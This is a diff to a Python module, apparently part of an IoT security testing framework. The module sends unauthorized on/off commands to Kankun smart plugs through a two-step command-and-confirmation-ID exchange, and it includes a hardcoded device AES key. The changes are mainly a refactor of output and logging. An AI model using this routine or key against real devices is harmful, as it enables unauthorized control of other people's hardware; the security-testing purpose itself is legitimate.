@@ -13,7 +13,22 @@ AES_KEY = "fdsl;mewrjope456fds4fbvfnjwaugfo"
 
 # pylint: disable=bare-except
 class KHijack(Test):
-    """Tests for Kankun smart plugs."""
+    """
+    Tests for Kankun smart plugs.
+
+    Output Format:
+    [
+        {
+            "command": "lan_phone%foobar...",
+            "response": "lan_device%foorbar...confirmid#172345",
+            "received_confirmation_id": 172345
+        },
+        {
+            "command2": "lan_phone%foobar...",
+            "response2": "lan_device%foorbar...,
+        }
+    ]
+    """
 
     def __init__(self):
         """Initialize the test."""
@@ -142,22 +157,18 @@ class KHijack(Test):
         cid = re.search(
             r"confirm#(\w+)", msg.decode("utf-8")
         )  # get the confirmation ID number only!!
-        if cid is not None:
+        if cid:
             return cid.group(1)
         return None
 
     def execute(self):
         """Execute the test."""
-
         TLog.generic(
             "Sending Unauthorized command ({}) to Kankun smart plug on ({}) port ({})".format(
                 self.args.cmd, self.args.rhost, self.args.rport
             )
         )
         cmd_op = None
-        print(
-            "--cmd ({}) cmd is on? ({})".format(self.args.cmd, (self.args.cmd == "on"))
-        )
         if self.args.cmd.lower() == "on":
             cmd_op = "open"
         elif self.args.cmd.lower() == "off":
@@ -171,31 +182,28 @@ class KHijack(Test):
         ret = None
         # Step 1: Send command and receive the confirmation ID response
         ret = self.send_recv(self.args.rhost, self.args.rport, msg)
-        self.output_handler(command=msg)
-        if ret is None:
+        if not ret:
             self.result.setstatus(
                 passed=False,
                 reason="Communication error while sending message({})".format(msg),
             )
             return
-        self.output_handler(response=ret.decode("utf-8"))
         # Get the confirmation ID
         cid = self.get_confirmid(ret)
-        if cid is None:
+        if not cid:
             self.result.setstatus(
                 passed=False,
                 reason="Couldn't extract confirmation id from ({})".format(ret),
             )
             return
-        self.output_handler(received_confirmation_id=cid)
+        self.output_handler(command=msg, response=ret, received_confirmation_id=cid)
         msg = self.createmsg("confirm", cid)
         # Step 2: Send Confirmation command with the confirmation ID and receive ack response
         ret = self.send_recv(self.args.rhost, self.args.rport, msg)
-        self.output_handler(command=msg)
-        if ret is None:
+        if not ret:
             self.result.setstatus(
                 passed=False,
                 reason="Communication error while sending message({})".format(msg),
             )
             return
-        self.output_handler(response=ret.decode("utf-8"))
+        self.output_handler(command2=msg, response2=ret)
